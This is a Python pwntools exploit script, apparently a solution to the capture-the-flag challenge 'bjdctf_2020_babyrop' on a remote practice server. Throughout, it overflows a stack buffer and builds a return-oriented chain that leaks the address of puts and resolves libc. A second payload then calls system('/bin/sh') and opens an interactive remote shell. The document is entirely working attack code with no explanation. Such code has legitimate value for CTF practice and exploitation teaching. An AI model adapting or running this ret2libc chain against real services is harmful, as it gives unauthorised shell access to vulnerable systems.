from pwn import *
from LibcSearcher import *

p = remote('node5.buuoj.cn', 26480)
elf = ELF('./bjdctf_2020_babyrop')
puts_plt_addr = elf.plt['puts']
print(hex(puts_plt_addr))
puts_glt_addr = elf.got['puts']
print(hex(puts_glt_addr))
pop_rdi_addr = 0x400733
vuln_addr = 0x40067D
payload = b'a' * (0x20 + 8) + p64(pop_rdi_addr) + p64(puts_glt_addr) + p64(puts_plt_addr) + p64(vuln_addr)
p.sendlineafter(b'story!\n', payload)
puts_real_addr = u64(p.recv(6).ljust(0x8, b'\x00'))
print(hex(puts_real_addr))
libc = LibcSearcher('puts', puts_real_addr)
libcbase = puts_real_addr - libc.dump('puts')
system_addr = libcbase + libc.dump('system')
bin_sh_addr = libcbase + libc.dump('str_bin_sh')
ret_addr = 0x4004c9
payload1 = b'a' * (0x20 + 8) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)
p.sendlineafter(b'story!\n', payload1)
p.interactive()